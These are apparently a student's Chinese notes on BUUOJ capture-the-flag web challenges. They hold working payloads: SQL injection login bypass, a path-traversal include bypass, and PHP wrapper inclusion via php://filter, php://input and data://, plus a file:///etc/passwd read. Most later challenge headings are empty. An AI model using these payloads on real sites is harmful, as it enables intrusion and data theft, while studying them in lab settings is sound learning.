
## 靶场_1

[[极客大挑战 2019]EasySQL1](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]EasySQL)

### 解题：

直接输入 万能密码

>' OR 1=1 --

![[屏幕截图 2022-07-28 173931.png]]

## 靶场_2

[[HCTF 2018]WarmUp1](https://buuoj.cn/challenges#[HCTF%202018]WarmUp)

### 解题：

查看源码 发现隐藏 网页source.php

![[屏幕截图 2022-07-28 174906.png]]

直接访问source.php 查看源代码 并审计

![[屏幕截图 2022-07-28 175120.png]]

> <?php
    highlight_file(__FILE__);
    class emmm
    {
        public static function checkFile(&$page)
        {
            $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
            if (! isset($page) || !is_string($page)) { // page参数不存在 page参数不是字符串 两为真执行
                echo "you can't see it";
                return false;
            }

            if (in_array($page, $whitelist)) { // page参数 在 whitelist 列表中存在
                return true;
            }

            $_page = mb_substr( // page参数中 从 0 到 mb 提供 位置 进行截取
                $page,
                0,
                mb_strpos($page . '?', '?') // page参数后加一个？并找到第一个？的位置
            );
            if (in_array($_page, $whitelist)) {// page参数 在 whitelist 列表中存在
                return true;
            }

            $_page = urldecode($page); page 进行URL解码
            $_page = mb_substr(// page参数中 从 0 到 mb 提供 位置 进行截取
                $_page,
                0,
                mb_strpos($_page . '?', '?')// page参数后加一个？并找到第一个？的位置
            );
            if (in_array($_page, $whitelist)) {// page参数 在 whitelist 列表中存在
                return true;
            }
            echo "you can't see it";
            return false;
        }
    }
    if (! empty($_REQUEST['file']) //判断 file 参数不为空
        && is_string($_REQUEST['file']) //判断 file 参数是字符串
        && emmm::checkFile($_REQUEST['file']) //进入 checkFile 函数判断
    ) {
        include $_REQUEST['file'];
        exit;
    } else {
        echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
    }  
?> 

构造payload：

>file=source.php?/../../../../ffffllllaaaagggg

*include函数有这么一个神奇的功能：以字符‘/’分隔（而且不计个数），若是在前面的字符串所代表的文件无法被PHP找到，则PHP会自动包含‘/’后面的文件——注意是最后一个‘/’*

## 靶场_3

[[极客大挑战 2019]Havefun1](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]Havefun)

### 解题

查看源代码

![[屏幕截图 2022-07-28 205445.png]]

>
$ cat=$_GET['cat'];
echo $cat;
if($cat == 'dog'){
echo 'Syc{cat_cat_cat_cat}';
}  

构造playload:

>/?cat=dog

## 靶场_4

[[ACTF2020 新生赛]Include1](https://buuoj.cn/challenges#[ACTF2020%20%E6%96%B0%E7%94%9F%E8%B5%9B]Include)

### 解题

查看源代码

![[屏幕截图 2022-07-29 082831.png]]

PHP伪协议

构造playload:

>/?file=php://filter/read=convert.base64-encode/resource=flag.php

Base64 解码

![[屏幕截图 2022-07-29 084455.png]]

### 备注
*PHP伪协议*

[参考目录](https://blog.csdn.net/cosmoslin/article/details/120695429)
[参考目录](https://www.php.cn/php-weizijiaocheng-481803.html)

#### file://

作用:

>用于访问文件（绝对路径、相对路径、网络路径）

实例:

>http://www.xx.com?file=file:///etc/passswd

#### php://

作用:

>用于访问输入输出流

##### php://filter

作用:

>读取源代码并进行base64编码输出

实例:

>http://xxx.x.x.x/cmd.php?cmd=php://filter/read=convert.base64-encode/resource=[文件名]（针对php文件需要base64编码）

参数:

>resource=<要过滤的数据流> 这个参数是必须的。它指定了你要筛选过滤的数据流
>read=<读链的筛选列表> 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。
>write=<写链的筛选列表> 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。
>
><；两个链的筛选列表> 任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。

##### php://input

作用:

>执行POST数据中的php代码

示例:

>http://xxx.x.x.x/cmd.php?cmd=php://input
>POST数据：<?php phpinfo()?>

#### data://

作用:

>data://数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。一般需要用到base64编码传输

示例:

>http://xxx.x.x.x/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b

## 靶场_5

[[强网杯 2019]随便注1](https://buuoj.cn/challenges#[%E5%BC%BA%E7%BD%91%E6%9D%AF%202019]%E9%9A%8F%E4%BE%BF%E6%B3%A8)

### 解题

![[屏幕截图 2022-07-29 091915.png]]



## 靶场_6
## 靶场_7
## 靶场_8
## 靶场_9
## 靶场_10
## 靶场_11
## 靶场_12
## 靶场_13
## 靶场_14
## 靶场_15
## 靶场_16
## 靶场_17
## 靶场_18
## 靶场_19
## 靶场_20